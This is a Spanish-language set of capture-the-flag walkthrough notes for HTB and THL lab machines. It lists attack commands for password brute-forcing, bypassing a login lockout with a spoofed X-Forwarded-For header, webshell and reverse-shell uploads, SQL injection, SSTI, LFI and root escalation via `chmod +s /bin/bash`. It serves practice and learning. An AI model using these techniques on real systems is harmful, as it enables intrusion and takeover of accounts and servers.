---
tags:
  - Walkthroughs
---
# Walkthroughs — Web y CMS

Basado en tus apuntes, con los comandos normalizados y algún añadido para que se entienda.
`[?]` = dato dudoso de la transcripción (verifícalo contra la máquina). Los payloads concretos
están en las [Chuletas](../../chuletas/index.md); aquí queda el flujo de cada máquina.

## Webos — 22, 80, 139, 445
- `dirsearch`; `/user/accounts` → hash en `admin.xml`[?]
- **SMB:** `smbclient -N -L //ip`; `netexec smb ip -u guest -p '' --shares`
- `netexec smb ip -u webos -p /usr/.../rockyou.txt --ignore-pw-decoding` → `geraldine`
- `smbmap -H ip -u webos -p geraldine -r webos --download 'webos/MarronJena.txt'`
- Identificar cifrado (decode.fr) → `admin:...`; `john --wordlist=./pass.txt hash.txt`
- `searchsploit` del CMS → `prover.py` (GitHub) → `python3 prover.py -t http://webos.thl`
- Clave SSH en `/opt/id_rsa` → `ssh2john` → `john` → `freestyle` → `ssh -i id_rsa webos@ip`
- **Escalada:** SUID en `python3` (ver [Escalada](../../chuletas/escalada.md))

## Nibbles (HTB)
- Código fuente → `/nibbleblog/`; `dirsearch` → `/nibbleblog/admin.php`
- Plugin **My Image** → `CVE-2015-6967`
- `/content/private/users.xml` → `admin`; password por defecto `nibbles`
- **Bloqueo del login:** Nibbleblog bloquea tras varios intentos fallidos *por IP*. Se evita
  mandando una IP distinta en cada petición con la cabecera `X-Forwarded-For: 9.9.9.9`
  (IP de ejemplo). Desde Burp Intruder, además del diccionario de contraseñas, se itera esa
  cabecera para seguir probando sin que te bloquee.
- Subir reverse en el plugin (`/content/private/plugins/my_image`) → usuario `nibbler`
- **Escalada:** `sudo -l` → `monitor.sh` ejecutable como root (NOPASSWD):
  ```bash
  echo 'chmod +s /bin/bash' >> /home/nibbler/personal/stuff/monitor.sh
  sudo /home/nibbler/personal/stuff/monitor.sh
  /bin/bash -p
  ```

## Facultad (THL)
- `dirsearch` → `/education`; `/etc/hosts` → `facultad.thl`
- `wpscan --url http://facultad.thl -e u` → `facultad`; Burp Intruder en `/wp-login.php`
- `wpscan --url ... --usernames facultad --passwords rockyou.txt` → `asd8gtik!`[?]
- **WP File Manager** → reverse shell → `cat /home/vivian/user.txt`
- `sudo -l` → `(gabri) /usr/bin/php` (GTFOBins); luego `/opt/vivian/script.sh` editable → `bash -p`

## Curling (HTB)
- `secret.txt` → `Curling2018!`; `joomscan -u http://curling.htb` → `/administrator`
- Editar plantilla `error.php` con webshell → `curl ... -G --data-urlencode "cmd=..."` (`nc -lvnp 4444`)
- `/home/floris/password-backup` → `xxd -r` → bzip2 → gzip → tar → `ssh floris@ip`
- **Escalada (cron):** `pspy64` revela cron root que lee `/home/floris/admin-area/input` (`curl -K`) → inyectar

## Magic (HTB)
- Login Burp con bypass de autenticación → `upload.php`
- Bypass de subida: imagen con shell añadida (`.php.png`) → ejecutar en `/images/upload/...`
- `chisel` para túnel a MySQL interno: `R:3307:127.0.0.1:3306`
- `mysql -h 127.0.0.1 -P 3307 -u theseus -p` (`iamkingtheseus`); `select * from login;`

## GoodGames (HTB)
- `dirsearch` → `/signup`; bypass de login por SQLi → admin
- SQLi UNION para enumerar BBDD y volcar `user` (ver [chuleta SQLi](../../chuletas/sqli-union.md)) → crackear el hash
- Con las credenciales, acceder al panel interno (`internal-administration`, otro vhost/puerto)
- **SSTI** en el perfil → RCE (ver [chuleta SSTI](../../chuletas/ssti.md))
  - *En GoodGames el motor real es **Jinja2 (Flask)**; tu apunte usaba sintaxis de Tornado (`{{os.system(...)}}`) como ejemplo genérico.*

## Report (THL) — 22, 80, 3306
- `dirsearch` → `/uploads /login.php /about.php`; registrarse → `cargas.php`
- Bypass de subida con `.phtml` + Content-Type `image/gif` + cabecera `GIF8;`
- **LFI** en `/about.php?file=...` (filtro `php://filter` para leer fuentes)
- `mysql -h ip -u root -p --skip-ssl`

## Torrijas (THL) — 80, 22, 3306
- `wpscan --url https://.../wordpress/ --enumerate ap --plugins-detection aggressive` → `web-directory-free 1.1.2`
- PoC del CVE (LFI) → `../../../../etc/passwd`[?]
- `hydra -L users.txt -P rockyou.txt ssh://ip` → `einkgirl`[?]
- `wp-config.php` → `mysql ...`; `SELECT * FROM primo;` → `su primo`
- **Escalada:** `sudo -l` → `bpftrace` (GTFOBins)

## Rockstars (THL) — 22, 80
- `dirsearch` se queda en `index.php`; fuzzing de parámetros con `x8` → `backdoor`
- `ffuf -u 'http://.../index.php?backdoor=FUZZ' -w common-PHP-Filenames`
- `backdoor=db.php` → shark; `backdoor=../../../etc/passwd` → usuarios

## Academy (THL) — 22, 80
- `dirsearch` → `/wordpress/wp-login.php`; `/etc/hosts` → `academy.thl`
- `wpscan --url http://academy.thl/wordpress --enumerate ap -P ...`; `--api-token <key>`
- Plugin **Bit File Manager** → `wp-content/uploads` → reverse shell → estabilizar

## Máquina Git/OUTFILE (sin nombre claro)
- `/desarrollo/.git` → gitdumper → `git log --oneline --all`
- SQLi `INTO OUTFILE` para dejar una webshell (ver [chuleta SQLi](../../chuletas/sqli-union.md))
- `cat config.php` → `su root`
